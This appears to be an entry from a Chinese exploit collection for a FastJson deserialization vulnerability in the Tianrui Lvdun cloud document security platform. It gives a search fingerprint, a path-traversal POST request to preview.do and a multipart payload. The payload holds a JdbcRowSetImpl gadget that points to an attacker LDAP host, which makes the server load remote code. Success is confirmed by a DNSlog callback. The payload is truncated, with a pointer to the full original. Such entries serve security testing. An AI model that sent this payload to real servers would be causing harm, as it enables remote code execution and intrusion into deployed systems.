# 天锐绿盘云文档安全管理平台preview存在FastJson反序列化漏洞

- **系统**：天锐绿盾　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`body="/lddsm/"`
- **请求**：`POST /lddsm/service/../admin/waterMarkConfig/preview.do HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk…`　`Content-Length: 594`

**请求体 / payload**
```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="oldWmId"
1
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="paramObj"
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<DNS>/TomcatBypass/TomcatEcho","autoCommit":true}}
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="picClearFlag"
1
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="example.jpg"
Content-Type: image/jpeg
1
--…（脚本共 639 字，完整版见原文）
```
- **预期**：200　|　Dnslog回显